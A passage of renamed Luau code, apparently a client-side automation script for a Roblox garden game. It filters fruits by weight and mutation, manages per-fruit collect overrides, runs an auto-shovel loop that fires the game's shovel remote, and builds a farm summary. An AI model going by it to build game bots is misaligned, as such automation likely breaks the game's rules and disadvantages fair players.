		if Z.SellMultiplierOverrides and (type(Z.SellMultiplierOverrides.ShouldSkipCollectFruitSellMultiplierOverrides) == "function" and Z.SellMultiplierOverrides.ShouldSkipCollectFruitSellMultiplierOverrides(V, G)) then
			return false
		end
		local y, j = Z.FruitFilters.GetMutationLookup(G)
		local i = Z.FruitCollectOverrides and Z.FruitCollectOverrides.GetOverrideFruitCollectOverrides(V) or nil
		if type(i) == "table" and i.enabled ~= false then
			local V = Z.FruitCollectOverrides.PassesOverrideFruitCollectOverrides(G, j, i)
			if V ~= nil then
				return V
			end
		end
		if not Z.FruitFilters.PassesWeightRange(G.w, h.collect_min_weight, h.collect_max_weight) then
			return false
		end
		if not Z.FruitFilters.PassesMutationSelection(j, h.collect_mutation_whitelist, h.collect_mutation_blacklist) then
			return false
		end
		local c = Z.FruitFilters.GetFruitVariant(G, j)
		if not Z.FruitFilters.PassesVariantSelection(c, h.collect_variant_whitelist, h.collect_variant_blacklist) then
			return false
		end
		local J = Z.TotalControl
		local T = J and (type(J.PassesFruitCollectTotalControl) == "function" and J.PassesFruitCollectTotalControl(G)) or nil
		if T ~= nil then
			return T == true
		end
		return true
	end,
	GetReadyFruits = function(G, V)
		local y = {}
		local j
		if type(G) == "string" and G ~= "" then
			j = Z.FruitFilters.GetFruitsUsingName(G, true)
		else
			j = Z.FruitFilters.GetAllFruits(true)
		end
		for G, j in ipairs(j) do
			if j.ready ~= true and not Z.FruitFilters.IsFruitReady(j.ob) then
				continue
			end
			if V and not Z.FruitFilters.PassesCollectorFilters(j) then
				continue
			end
			table.insert(y, j)
		end
		return y
	end;
	GetFarmFruitCounts = function()
		local G = {}
		local V = Z.FruitFiltersDataSync
		if not V or type(V.Plants) ~= "table" then
			return G
		end
		if not V.Started and type(V.StartSync) == "function" then
			V.StartSync()
		end
		local function y(V, y)
			V = tostring(V or "")
			if V == "" then
				return
			end
			if not G[V] then
				G[V] = {
					total = 0;
					ready = 0
				}
			end
			G[V].total += 1
			if y then
				G[V].ready += 1
			end
		end
		for G, j in pairs(V.Plants) do
			if type(j) ~= "table" or j.Removed then
				continue
			end
			local i = tostring(j.PlantName or "")
			if i == "" then
				continue
			end
			local c = false
			if type(V.IsSingleHarvestPlant) == "function" then
				c = V.IsSingleHarvestPlant(i) == true
			else
				c = Z.SeedData.IsSingleHarvest(i) == true
			end
			if c then
				y(i, type(V.IsPlantReady) == "function" and V.IsPlantReady(j) == true)
			else
				for G, Z in pairs(j.Fruits or {}) do
					if type(Z) == "table" and not Z.Removed then
						y(i, type(V.IsFruitReady) == "function" and V.IsFruitReady(Z) == true)
					end
				end
			end
		end
		return G
	end,
	GetFruitTypeDropdownWithFarmCounts = function()
		local G = {}
		local V = Z.FruitFilters.GetFarmFruitCounts()
		for y, j in ipairs(g.AllSeedsDataTable) do
			if type(j) ~= "table" then
				continue
			end
			local i = tostring(j.name or "")
			if i == "" then
				continue
			end
			local c = tostring(j.rarity or "Common")
			local J = Z.Data.GetRarityColor(c)
			local T = V[i] or {
				total = 0,
				ready = 0
			}
			table.insert(G, {
				Text = string.format("<font color=\"#FFFFFF\">%s</font> <font color=\"%s\">%s</font> <font color=\"#7CFC00\">x%d Rdy</font> <font color=\"#BBBBBB\">/%d</font>", i, J, c, tonumber(T.ready) or 0, tonumber(T.total) or 0),
				Value = i
			})
		end
		return G
	end
}
Z.FruitCollectOverrides = {
	GetMutationDropdownFruitCollectOverrides = function()
		local G = {}
		local V = {}
		for y, Z in ipairs(Z.FruitFilters.GetMutationNames()) do
			Z = tostring(Z or "")
			if Z ~= "" and not V[Z] then
				V[Z] = true
				table.insert(G, Z)
			end
		end
		for y, Z in ipairs(Z.FruitFilters.GetVariantNames()) do
			Z = tostring(Z or "")
			if Z ~= "" and (Z ~= "Normal" and not V[Z]) then
				V[Z] = true
				table.insert(G, Z)
			end
		end
		table.sort(G)
		return G
	end;
	CopySelectionFruitCollectOverrides = function(G)
		local V = {}
		if type(G) ~= "table" then
			return V
		end
		for G, y in pairs(G) do
			if y ~= nil and (y ~= false and tostring(y) ~= "") then
				if type(G) == "number" then
					V[tostring(y)] = true
				else
					V[tostring(G)] = true
				end
			end
		end
		return V
	end,
	IsValidFruitNameFruitCollectOverrides = function(G)
		G = tostring(G or "")
		return G ~= "" and (type(g.SeedDataFast) == "table" and g.SeedDataFast[G] ~= nil)
	end;
	GetCombinedMutationLookupFruitCollectOverrides = function(G, V)
		local y = {}
		if type(V) == "table" then
			for G, V in pairs(V) do
				if V then
					y[tostring(G or "")] = true
				end
			end
		end
		local j = Z.FruitFilters.GetFruitVariant(G, V)
		j = tostring(j or "")
		if j ~= "" and j ~= "Normal" then
			y[j] = true
		end
		return y
	end,
	GetOverrideFruitCollectOverrides = function(G)
		G = tostring(G or "")
		local V = type(h.collect_fruit_overrides) == "table" and h.collect_fruit_overrides or {}
		local y = V[G]
		if type(y) ~= "table" then
			return nil
		end
		local j = Z.FruitFilters.RoundWeight(tonumber(y.min_weight) or 0)
		local i = Z.FruitFilters.RoundWeight(tonumber(y.max_weight) or 99)
		if j < 0 then
			j = 0
		end
		if i < j then
			i = j
		end
		return {
			enabled = y.enabled ~= false;
			collect_if_mutations = Z.FruitCollectOverrides.CopySelectionFruitCollectOverrides(y.collect_if_mutations);
			dont_collect_if_mutations = Z.FruitCollectOverrides.CopySelectionFruitCollectOverrides(y.dont_collect_if_mutations),
			min_weight = j;
			max_weight = i,
			collect_lower_kg_fruits = y.collect_lower_kg_fruits == true;
			protect_kg_range = y.protect_kg_range == true
		}
	end;
	GetOverrideSummaryFruitCollectOverrides = function(G, V)
		G = tostring(G or "")
		V = type(V) == "table" and V or Z.FruitCollectOverrides.GetOverrideFruitCollectOverrides(G)
		if G == "" or type(V) ~= "table" then
			return "Invalid fruit override"
		end
		local function y(G, V)
			local y = {}
			if type(G) == "table" then
				for G, V in pairs(G) do
					if V ~= nil and (V ~= false and tostring(G or "") ~= "") then
						table.insert(y, tostring(G))
					end
				end
			end
			table.sort(y)
			return # y > 0 and table.concat(y, ", ") or V
		end
		local j = y(V.collect_if_mutations, "Any")
		local i = y(V.dont_collect_if_mutations, "None")
		local c = V.enabled == false and "Off" or "On"
		local J = V.collect_lower_kg_fruits == true and "Yes" or "No"
		local T = V.protect_kg_range == true and "Yes" or "No"
		return string.format("%s | %s | If: %s | Block: %s | %.2f-%.2fKG | Lower: %s | Protect: %s", G, c, j, i, tonumber(V.min_weight) or 0, tonumber(V.max_weight) or 99, J, T)
	end;
	GetSortedOverridesFruitCollectOverrides = function()
		local G = {}
		local V = type(h.collect_fruit_overrides) == "table" and h.collect_fruit_overrides or {}
		for V, y in pairs(V) do
			V = tostring(V or "")
			if V ~= "" and type(y) == "table" then
				local y = Z.FruitCollectOverrides.GetOverrideFruitCollectOverrides(V)
				if y then
					table.insert(G, {
						fruitName = V,
						rule = y
					})
				end
			end
		end
		table.sort(G, function(G, V)
			return tostring(G.fruitName or "") < tostring(V.fruitName or "")
		end)
		return G
	end;
	GetOverrideUiKeyFruitCollectOverrides = function(G)
		G = tostring(G or "")
		local V = 0
		for y = 1, # G, 1 do
			V = ((V * 31 + string.byte(G, y))) % 100000000
		end
		local y = (G:gsub("[^%w_]", "_")):sub(1, 40)
		if y == "" then
			y = "fruit"
		end
		return "fruit_collect_override_active_" .. (y .. ("_" .. tostring(V)))
	end,
	SaveOverrideFruitCollectOverrides = function(G, V, y, j, i, c, J)
		G = tostring(G or "")
		if not Z.FruitCollectOverrides.IsValidFruitNameFruitCollectOverrides(G) then
			return false, "Select a fruit first"
		end
		j = Z.FruitFilters.RoundWeight(tonumber(j) or 0)
		i = Z.FruitFilters.RoundWeight(tonumber(i) or 99)
		if j < 0 then
			return false, "Minimum KG must be 0 or more"
		end
		if i < j then
			return false, "Maximum KG must be higher than minimum KG"
		end
		if type(h.collect_fruit_overrides) ~= "table" then
			h.collect_fruit_overrides = {}
		end
		h.collect_fruit_overrides[G] = {
			enabled = true,
			collect_if_mutations = Z.FruitCollectOverrides.CopySelectionFruitCollectOverrides(V);
			dont_collect_if_mutations = Z.FruitCollectOverrides.CopySelectionFruitCollectOverrides(y),
			min_weight = j;
			max_weight = i,
			collect_lower_kg_fruits = c == true,
			protect_kg_range = J == true
		}
		Z.FruitCollect.ResetBucket()
		a.Save.SaveDataSync()
		Z.FruitCollectOverrides.RefreshOverridesFruitCollectOverrides()
		return true, "Fruit override saved"
	end,
	RemoveOverrideFruitCollectOverrides = function(G)
		G = tostring(G or "")
		if G == "" or type(h.collect_fruit_overrides) ~= "table" then
			return false
		end
		h.collect_fruit_overrides[G] = nil
		Z.FruitCollect.ResetBucket()
		a.Save.SaveDataSync()
		Z.FruitCollectOverrides.RefreshOverridesFruitCollectOverrides()
		return true
	end,
	ToggleOverrideFruitCollectOverrides = function(G, V)
		G = tostring(G or "")
		if G == "" or type(h.collect_fruit_overrides) ~= "table" or type(h.collect_fruit_overrides[G]) ~= "table" then
			return false
		end
		h.collect_fruit_overrides[G].enabled = V == true
		Z.FruitCollect.ResetBucket()
		a.Save.SaveDataSync()
		Z.FruitCollectOverrides.RefreshOverridesFruitCollectOverrides()
		return true
	end,
	RefreshOverridesFruitCollectOverrides = function()
		local G = g.FruitCollectOverrideUiRefs
		if type(G) == "table" and type(G.RefreshOverridesFruitCollectOverrides) == "function" then
			G.RefreshOverridesFruitCollectOverrides()
		end
		return true
	end;
	PassesOverrideFruitCollectOverrides = function(G, V, y)
		if type(G) ~= "table" or type(y) ~= "table" then
			return true
		end
		local j = tonumber(G.w) or 0
		local i = tonumber(y.min_weight) or 0
		local c = tonumber(y.max_weight) or 99
		if y.protect_kg_range == true then
			if not Z.FruitFilters.PassesWeightRange(j, i, c) then
				return nil
			end
			local J = Z.FruitCollectOverrides.GetCombinedMutationLookupFruitCollectOverrides(G, V)
			local T = not Z.FruitFilters.IsSelectionEmpty(y.dont_collect_if_mutations)
			local d = not Z.FruitFilters.IsSelectionEmpty(y.collect_if_mutations)
			if T and Z.FruitFilters.HasSelectedMutation(y.dont_collect_if_mutations, J) then
				return false
			end
			if d and Z.FruitFilters.HasSelectedMutation(y.collect_if_mutations, J) then
				return false
			end
			if T or d then
				return nil
			end
			return false
		end
		if j < i and y.collect_lower_kg_fruits == true then
			return nil
		end
		if not Z.FruitFilters.PassesWeightRange(j, i, c) then
			return false
		end
		local J = Z.FruitCollectOverrides.GetCombinedMutationLookupFruitCollectOverrides(G, V)
		if not Z.FruitFilters.IsSelectionEmpty(y.dont_collect_if_mutations) then
			if Z.FruitFilters.HasSelectedMutation(y.dont_collect_if_mutations, J) then
				return false
			end
		end
		if not Z.FruitFilters.IsSelectionEmpty(y.collect_if_mutations) then
			return Z.FruitFilters.HasSelectedMutation(y.collect_if_mutations, J)
		end
		return true
	end
}
Z.ShovelTool = {
	GetTool = function()
		local G = Z.Player.GetTool_Holding()
		if G and G:IsA("Tool") then
			local V = G:GetAttribute("Shovel")
			if type(V) == "string" and V ~= "" then
				return G
			end
		end
		local V = y.LocalPlayer and y.LocalPlayer:FindFirstChild("Backpack")
		if not V then
			return nil
		end
		for G, V in ipairs(V:GetChildren()) do
			if not V:IsA("Tool") then
				continue
			end
			local y = V:GetAttribute("Shovel")
			if type(y) == "string" and y ~= "" then
				return V
			end
		end
		return nil
	end,
	Equip = function()
		local G = Z.ShovelTool.GetTool()
		if not G then
			return nil, false
		end
		if Z.Player.IsToolHeld(G) then
			return G, false
		end
		if not Z.Player.EquipTool(G) then
			return nil, false
		end
		task.wait(.3)
		if not Z.Player.IsToolHeld(G) then
			return nil, false
		end
		return G, true
	end;
	Use = function(G, V, Z)
		if type(G) ~= "string" or G == "" then
			return false
		end
		if type(V) ~= "string" then
			return false
		end
		if not Z or not Z:IsA("Tool") then
			return false
		end
		if not y.Character or Z.Parent ~= y.Character then
			return false
		end
		local j = Z:GetAttribute("Shovel")
		if type(j) ~= "string" or j == "" then
			return false
		end
		local i = y.Networking and (y.Networking.Shovel and y.Networking.Shovel.UseShovel)
		if not i or type(i.Fire) ~= "function" then
			return false
		end
		local c = pcall(function()
			i:Fire(G, V, j, Z)
		end)
		task.wait(.8)
		return c
	end;
	Cleanup = function(G)
		if not G then
			return
		end
		Z.Player.UnequipTools()
	end
}
g.ShovelStatusText = ""
Z.ShovelFruits = {
	MaxPerLoop = 60;
	RequestDelay = .1;
	EquippedBySystem = false,
	TotalRemoved = 0,
	LastLoopRemoved = 0,
	SetStatus = function(G, V)
		G = tostring(G or "Waiting")
		V = tostring(V or "#FFFFFF")
		g.ShovelStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\226\154\160\239\184\143 [Fruit Shovel]</font> <font color=\'%s\'>%s</font></stroke>", V, G)
	end,
	ClearStatus = function()
		g.ShovelStatusText = ""
	end,
	SetWaitingStatus = function()
		Z.ShovelFruits.SetStatus(string.format("Waiting | Removed: %d", Z.ShovelFruits.TotalRemoved), "#CFCFCF")
	end;
	GetMutationNames = function()
		return Z.FruitFilters.GetMutationNames()
	end;
	GetVariantNames = function()
		return Z.FruitFilters.GetVariantNames()
	end;
	GetFruitTypeDropdown = function()
		local G = {}
		for V, y in ipairs(g.AllSeedsDataTable) do
			if type(y) ~= "table" then
				continue
			end
			local j = y.name
			local i = y.single == true
			if type(j) ~= "string" or j == "" or i then
				continue
			end
			local c = tostring(y.rarity or "Common")
			local J = Z.Data.GetRarityColor(c)
			table.insert(G, {
				Text = string.format("<font color=\"#FFFFFF\">%s</font> <font color=\"%s\">%s</font>", j, J, c),
				Value = j
			})
		end
		return G
	end,
	GetAllFruitTypeSelection = function()
		local G = {}
		for V, y in ipairs(g.AllSeedsDataTable) do
			if type(y) ~= "table" then
				continue
			end
			local Z = y.name
			local j = y.single == true
			if type(Z) == "string" and (Z ~= "" and not j) then
				G[Z] = true
			end
		end
		return G
	end;
	SplitMutations = function(G)
		return Z.FruitFilters.SplitMutations(G)
	end;
	GetVariantFromMutations = function(G)
		return Z.FruitFilters.GetVariantFromMutations(G)
	end;
	HasSelectedMutation = function(G, V)
		return Z.FruitFilters.HasSelectedMutation(G, V)
	end,
	PassesMutationFilters = function(G)
		return Z.FruitFilters.PassesMutationSelection(G, h.shovel_mutation_whitelist, h.shovel_mutation_blacklist)
	end,
	GetShovelTool = function()
		local G = Z.Player.GetTool_Holding()
		if G and G:IsA("Tool") then
			local V = G:GetAttribute("Shovel")
			if type(V) == "string" and V ~= "" then
				return G
			end
		end
		local V = y.LocalPlayer
		local j = V and V:FindFirstChild("Backpack")
		if not j then
			return nil
		end
		for G, V in ipairs(j:GetChildren()) do
			if not V:IsA("Tool") then
				continue
			end
			local y = V:GetAttribute("Shovel")
			if type(y) == "string" and y ~= "" then
				return V
			end
		end
		return nil
	end;
	IsValidFruitTarget = function(G)
		if type(G) ~= "table" then
			return false
		end
		local V = tostring(G.plantId or "")
		local y = tostring(G.fruitId or "")
		local j = tostring(G.name or "")
		if V == "" or y == "" or j == "" then
			return false
		end
		if Z.SeedData.IsSingleHarvest(j) then
			return false
		end
		return true
	end,
	ShouldShovelFruit = function(G)
		if type(G) ~= "table" then
			return false
		end
		if not Z.ShovelFruits.IsValidFruitTarget(G) then
			return false
		end
		local V = G.name
		if type(V) ~= "string" or V == "" then
			return false
		end
		local y = h.shovel_fruit_types
		if type(y) ~= "table" or not Z.FruitFilters.IsSelected(y, V) then
			return false
		end
		local j = tonumber(G.w) or 0
		local i = tonumber(h.shovel_min_weight) or 0
		local c = tonumber(h.shovel_max_weight) or 1000000000
		if G.has_weight == false or j <= 0 then
			return false
		end
		if not Z.FruitFilters.PassesWeightRange(j, i, c) then
			return false
		end
		local J = type(G.m) == "string" and G.m or ""
		local T, d = Z.FruitFilters.SplitMutations(J)
		local u = Z.FruitFilters.GetFruitVariant(G, d)
		local q = h.shovel_variants
		if type(q) ~= "table" or not Z.FruitFilters.IsSelected(q, u) then
			return false
		end
		if not Z.ShovelFruits.PassesMutationFilters(d) then
			return false
		end
		return true
	end;
	GetMatchingFruits = function()
		local G = {}
		local V = Z.FruitFilters.GetAllFruits()
		if type(V) ~= "table" then
			return G
		end
		for V, y in ipairs(V) do
			if Z.ShovelFruits.ShouldShovelFruit(y) then
				table.insert(G, y)
			end
		end
		table.sort(G, function(G, V)
			return ((tonumber(G.w) or 0)) < ((tonumber(V.w) or 0))
		end)
		return G
	end;
	ShovelFruit = function(G, V)
		if type(G) ~= "table" then
			return false
		end
		if not V or not V.Parent or not V:IsA("Tool") then
			return false
		end
		local j = y.Character
		if not j or V.Parent ~= j then
			return false
		end
		local i = tostring(G.plantId or "")
		local c = tostring(G.fruitId or "")
		if i == "" or c == "" then
			return false
		end
		return Z.ShovelTool.Use(i, c, V)
	end;
	CleanupTool = function()
		if not Z.ShovelFruits.EquippedBySystem then
			return
		end
		Z.ShovelFruits.EquippedBySystem = false
		Z.Player.UnequipTools()
	end,
	Run = function()
		Z.ShovelFruits.LastLoopRemoved = 0
		if not h.auto_shovel_fruits then
			Z.ShovelFruits.ClearStatus()
			return 0
		end
		local G = h.shovel_fruit_types
		if type(G) ~= "table" or next(G) == nil then
			Z.ShovelFruits.SetStatus("Paused: select fruit types", "#FFCC66")
			return 0
		end
		local V = h.shovel_variants
		if type(V) ~= "table" or next(V) == nil then
			Z.ShovelFruits.SetStatus("Paused: select a variant", "#FFCC66")
			return 0
		end
		Z.ShovelFruits.SetStatus("Scanning garden...", "#66CCFF")
		local y = Z.ShovelFruits.GetMatchingFruits()
		if type(y) ~= "table" or # y == 0 then
			Z.ShovelFruits.SetWaitingStatus()
			return 0
		end
		Z.ShovelFruits.SetStatus(string.format("Found %d matching fruit%s", # y, # y == 1 and "" or "s"), "#66CCFF")
		local j = Z.ShovelFruits.GetShovelTool()
		if not j then
			Z.ShovelFruits.SetStatus("Paused: shovel not found", "#FF6B6B")
			return 0
		end
		local i = Z.Player.IsToolHeld(j)
		if not i then
			Z.ShovelFruits.SetStatus("Equipping shovel...", "#FFD966")
			local G = Z.Player.EquipTool(j)
			if not G then
				Z.ShovelFruits.SetStatus("Failed to equip shovel", "#FF6B6B")
				return 0
			end
			Z.ShovelFruits.EquippedBySystem = true
			task.wait(.15)
		end
		if not Z.Player.IsToolHeld(j) then
			Z.ShovelFruits.CleanupTool()
			Z.ShovelFruits.SetStatus("Shovel was unequipped", "#FF6B6B")
			return 0
		end
		local c = 0
		for G, V in ipairs(y) do
			if not h.auto_shovel_fruits then
				break
			end
			if c >= Z.ShovelFruits.MaxPerLoop then
				break
			end
			if not Z.ShovelFruits.ShouldShovelFruit(V) then
				continue
			end
			if not Z.Player.IsToolHeld(j) then
				Z.ShovelFruits.SetStatus("Stopped: shovel unequipped", "#FF6B6B")
				break
			end
			local i = tostring(V.name or "Fruit")
			local J = tonumber(V.w) or 0
			Z.ShovelFruits.SetStatus(string.format("Removing %s %.2fkg (%d/%d)", i, J, G, # y), "#FFAA44")
			local T = Z.ShovelFruits.ShovelFruit(V, j)
			if T then
				c += 1
				Z.ShovelFruits.TotalRemoved += 1
				Z.ShovelFruits.LastLoopRemoved = c
				Z.ShovelFruits.SetStatus(string.format("Removed %s %.2fkg | Total: %d", i, J, Z.ShovelFruits.TotalRemoved), "#7CFC00")
				task.wait(Z.ShovelFruits.RequestDelay)
			end
		end
		Z.ShovelFruits.CleanupTool()
		if c > 0 then
			Z.ShovelFruits.SetStatus(string.format("Removed %d | Total: %d | Waiting", c, Z.ShovelFruits.TotalRemoved), "#7CFC00")
		elseif h.auto_shovel_fruits then
			Z.ShovelFruits.SetWaitingStatus()
		end
		return c
	end,
	LoopShovelFruits = function()
		if not h.auto_shovel_fruits then
			Z.ShovelFruits.ClearStatus()
			return 0
		end
		local G, V = pcall(function()
			return Z.ShovelFruits.Run()
		end)
		if not G then
			Z.ShovelFruits.CleanupTool()
			Z.ShovelFruits.SetStatus("Error: shovel loop failed", "#FF4444")
			warn("[ShovelFruits] Loop error:", V)
			return 0
		end
		return tonumber(V) or 0
	end
}
Z.FarmDetails = {
	Label = nil;
	Busy = false,
	Started = false;
	RefreshDelay = 3,
	FormatVariant = function(G)
		G = tostring(G or "Normal")
		if G == "Gold" then
			return "<font color=\'#FFD700\'>\240\159\140\159 Gold</font>"
		end
		if G == "Rainbow" then
			return "<font color=\'#FF66FF\'>\240\159\140\136 Rainbow</font>"
		end
		return "<font color=\'#FFFFFF\'>" .. (G .. "</font>")
	end;
	FormatCount = function(G)
		local V = tostring(math.max(math.floor(tonumber(G) or 0), 0))
		while true do
			local G, y = V:gsub("^(-?%d+)(%d%d%d)", "%1,%2")
			V = G
			if y == 0 then
				break
			end
		end
		return V
	end,
	FormatWeight = function(G)
		local V = string.format("%.2f", tonumber(G) or 0)
		return V:gsub("%.?0+$", "")
	end;
	SplitMutationTextFarmDetails = function(G)
		local V = {}
		if Z.ShovelFruits and type(Z.ShovelFruits.SplitMutations) == "function" then
			local V, y = pcall(function()
				return Z.ShovelFruits.SplitMutations(G)
			end)
			if V and type(y) == "table" then
				return y
			end
		end
		G = tostring(G or "")
		for G in G:gmatch("[^,%s]+") do
			G = tostring(G or "")
			if G ~= "" then
				table.insert(V, G)
			end
		end
		return V
	end,
	GetVariantNamesFarmDetails = function()
		if Z.ShovelFruits and type(Z.ShovelFruits.GetVariantNames) == "function" then
			local G, V = pcall(Z.ShovelFruits.GetVariantNames)
			if G and type(V) == "table" then
				return V
			end
		end
		return {
			"Normal",
			"Gold",
			"Rainbow"
		}
	end,
	IsSingleHarvestFarmDetails = function(G)
		local V = Z.FruitFiltersDataSync
		if V and type(V.IsSingleHarvestPlant) == "function" then
			return V.IsSingleHarvestPlant(G) == true
		end
		return Z.SeedData.IsSingleHarvest(G) == true
	end,
	IsReadyFarmDetails = function(G, V)
		local y = Z.FruitFiltersDataSync
		if type(G) ~= "table" or G.Removed then
			return false
		end
		if V and (y and type(y.IsPlantReady) == "function") then
			return y.IsPlantReady(G) == true
		end
		if not V and (y and type(y.IsFruitReady) == "function") then
			return y.IsFruitReady(G) == true
		end
		local j = tonumber(G.Age) or 0
		local i = tonumber(G.MaxAge) or 0
		return i > 0 and j >= i
	end;
	GetWeightFarmDetails = function(G, V, y)
		local j = Z.FruitFiltersDataSync
		if not j or type(j.GetWeightData) ~= "function" then
			return 0
		end
		local i, c = pcall(function()
			return j.GetWeightData(G, V, y)
		end)
		if not i or type(c) ~= "table" then
			return 0
		end
		return tonumber(c.weight) or 0
	end,
	AddFruitDataFarmDetails = function(G, V, y, j, i, c, J)
		local T = Z.FruitFiltersDataSync
		if not T or type(G) ~= "table" or G.Removed then
			return false
		end
		local d = tostring(G.PlantName or "")
		if d == "" then
			return false
		end
		local u = y and G or V
		if type(u) ~= "table" or u.Removed then
			return false
		end
		i.totalFruits += 1
		if Z.FarmDetails.IsReadyFarmDetails(u, y) then
			i.totalReady += 1
		else
			i.totalGrowing += 1
		end
		local q = Z.FarmDetails.GetWeightFarmDetails(d, u, y)
		if q > j.maxWeight then
			j.maxWeight = q
		end
		local g = tostring(u.Mutation or G.Mutation or "")
		local E = "Normal"
		if type(T.GetVariant) == "function" then
			E = T.GetVariant(g, u.Variant or G.Variant)
		elseif g:find("Rainbow") then
			E = "Rainbow"
		elseif g:find("Gold") then
			E = "Gold"
		end
		c[E] = ((c[E] or 0)) + 1
		for G, V in ipairs(Z.FarmDetails.SplitMutationTextFarmDetails(g)) do
			V = tostring(V or "")
			if V ~= "" and (V ~= "Gold" and V ~= "Rainbow") then
				J[V] = ((J[V] or 0)) + 1
			end
		end
		return true
	end;
	BuildText = function()
		local G = Z.FruitFiltersDataSync
		if not G or type(G.Plants) ~= "table" then
			return "<font color=\'#AFAFAF\'>Farm data is not ready yet.</font>"
		end
		if not G.Started and type(G.StartSync) == "function" then
			G.StartSync()
		end
		local V = {}
		local y = {}
		local j = {}
		local i = {
			totalPlants = 0,
			totalFruits = 0,
			totalReady = 0,
			totalGrowing = 0
		}
		for G, c in pairs(G.Plants) do
			if type(c) ~= "table" or c.Removed then
				continue
			end
			local J = tostring(c.PlantName or "")
			if J == "" then
				continue
			end
			local T = tostring(g.SeedRarity[J] or "Unknown")
			local d = V[T]
			if not d then
				d = {}
				V[T] = d
			end
			local u = d[J]
			if not u then
				u = {
					name = J,
					plants = 0;
					maxWeight = 0
				}
				d[J] = u
			end
			u.plants += 1
			i.totalPlants += 1
			if Z.FarmDetails.IsSingleHarvestFarmDetails(J) then
				Z.FarmDetails.AddFruitDataFarmDetails(c, nil, true, u, i, j, y)
			else
				for G, V in pairs(c.Fruits or {}) do
					Z.FarmDetails.AddFruitDataFarmDetails(c, V, false, u, i, j, y)
				end
			end
		end
		if i.totalPlants <= 0 then
			return "<font color=\'#AFAFAF\'>No farm data found yet. Wait for garden load or rejoin.</font>"
		end
		local c = {}
		local J = {}
		local T = {}
		for G, V in ipairs(Z.FarmDetails.GetVariantNamesFarmDetails()) do
			c[V] = G
		end
		for G, V in pairs(j) do
			table.insert(J, {
				name = G;
				amount = V,
				order = c[G] or 0
			})
		end
		table.sort(J, function(G, V)
			if G.order ~= V.order then
				return G.order < V.order
			end
			return G.name < V.name
		end)
		for G, V in ipairs(J) do
			table.insert(T, string.format("%s <font color=\'#FFA500\'>x%s</font>", Z.FarmDetails.FormatVariant(V.name), Z.FarmDetails.FormatCount(V.amount)))
		end
		local d = {
			"<b><font color=\'#7CFC00\'>Farm Summary</font></b> <font color=\'#66CCFF\'>(Data)</font>\n",
			string.format("<font color=\'#FFFFFF\'>Total Plants:</font> <font color=\'#FFA500\'>x%s</font>\n", Z.FarmDetails.FormatCount(i.totalPlants));
			string.format("<font color=\'#FFFFFF\'>Total Fruits:</font> <font color=\'#66CCFF\'>x%s</font>\n", Z.FarmDetails.FormatCount(i.totalFruits)),
			string.format("<font color=\'#FFFFFF\'>Ready:</font> <font color=\'#7CFC00\'>x%s</font> / <font color=\'#FFAA55\'>x%s</font>\n", Z.FarmDetails.FormatCount(i.totalReady), Z.FarmDetails.FormatCount(i.totalGrowing));
			string.format("<font color=\'#FFFFFF\'>Variants:</font> %s\n\n", # T > 0 and table.concat(T, "  ") or "<font color=\'#AFAFAF\'>None</font>")
		}
		local u = {}
		for G, V in pairs(V) do
			table.insert(u, {
				name = G,
				plants = V,
				rank = g.RarityRank[G] or 0
			})
		end
		table.sort(u, function(G, V)
			if G.rank ~= V.rank then
				return G.rank > V.rank
			end
			return G.name < V.name
		end)
		for G, V in ipairs(u) do
			local y = Z.Data.GetRarityColor(V.name)
			local j = {}
			for G, V in pairs(V.plants) do
				table.insert(j, V)
			end
			table.sort(j, function(G, V)
				if G.plants ~= V.plants then
					return G.plants > V.plants
				end
				return G.name < V.name
			end)
			table.insert(d, string.format("<b><font color=\'%s\'>%s</font></b>\n", y, V.name))
			for G, V in ipairs(j) do
				table.insert(d, string.format("<font color=\'#FFFFFF\'>%s</font> <font color=\'#FFA500\'>x%s</font> <font color=\'#FFFF00\'>(%skg Max)</font>\n", V.name, Z.FarmDetails.FormatCount(V.plants), Z.FarmDetails.FormatWeight(V.maxWeight)))
			end
			table.insert(d, "\n")
		end
		local q = {}
		for G, V in pairs(y) do
			table.insert(q, {
				name = G,
				amount = V
			})
		end
		table.sort(q, function(G, V)
			if G.amount ~= V.amount then
				return G.amount > V.amount
			end
			return G.name < V.name
		end)
		if # q > 0 then
			table.insert(d, "<b><font color=\'#FF66FF\'>Mutations In Farm</font></b>\n")
			for G, V in ipairs(q) do
				table.insert(d, string.format("<font color=\'#FFFFFF\'>%s</font>: <font color=\'#FFA500\'>x%d</font>\n", V.name, V.amount))
			end
		end
		return table.concat(d)
	end;
	Update = function()
		local G = Z.FarmDetails.Label
		if Z.FarmDetails.Busy or not G or type(G.SetText) ~= "function" then
			return false
		end
		Z.FarmDetails.Busy = true
		local V, y = pcall(Z.FarmDetails.BuildText)
		Z.FarmDetails.Busy = false
		if not V then
			warn("[FarmDetails]", y)
			G:SetText("<font color=\'#FF6666\'>Farm details failed to refresh.</font>")
			return false
		end
		G:SetText(y)
		return true
	end;
	Start = function()
		if Z.FarmDetails.Started then
			return
		end
		Z.FarmDetails.Started = true
		task.spawn(function()
			while Z.FarmDetails.Started do
				Z.FarmDetails.Update()
				task.wait(Z.FarmDetails.RefreshDelay)
			end
		end)
	end
}
g.PlantShovelStatusText = ""
Z.PlantShovel = {
	MaxPerLoop = 50,
	RequestDelay = .9,
	SetStatus = function(G, V)
		G = tostring(G or "Waiting")
		V = tostring(V or "#FFFFFF")
		g.PlantShovelStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FF5555\'>\226\154\160\239\184\143 [Plant Shovel]</font> <font color=\'%s\'>%s</font></stroke>", V, G)
	end;
	ClearStatus = function()
		g.PlantShovelStatusText = ""
	end;
	GetPlantTypeDropdown = function()
		local G = {}
		local V = Z.Farm.GetPlantedSeedCounts()
		for y, j in ipairs(g.AllSeedsDataTable) do
			if type(j) ~= "table" then
				continue
			end
			local i = j.name
			if type(i) ~= "string" or i == "" then
				continue
			end
			if j.single == true then
				continue
			end
			local c = tonumber(V[i]) or 0
			local J = c > 0 and "#FFD700" or "#FF5555"
			local T = tostring(j.rarity or "")
			local d = Z.Data.GetRarityColor(T)
			table.insert(G, {
				Text = string.format("<font color=\"%s\">x%d</font> <font color=\"#FFFFFF\">%s</font> <font color=\"%s\">%s</font>", J, c, i, d, T),
				Value = i
			})
		end
		table.sort(G, function(G, y)
			local Z = tonumber(V[G.Value]) or 0
			local j = tonumber(V[y.Value]) or 0
			if Z ~= j then
				return Z > j
			end
			return tostring(G.Value) < tostring(y.Value)
		end)
		return G
	end;
	GetAllPlantTypeSelection = function()
		local G = {}
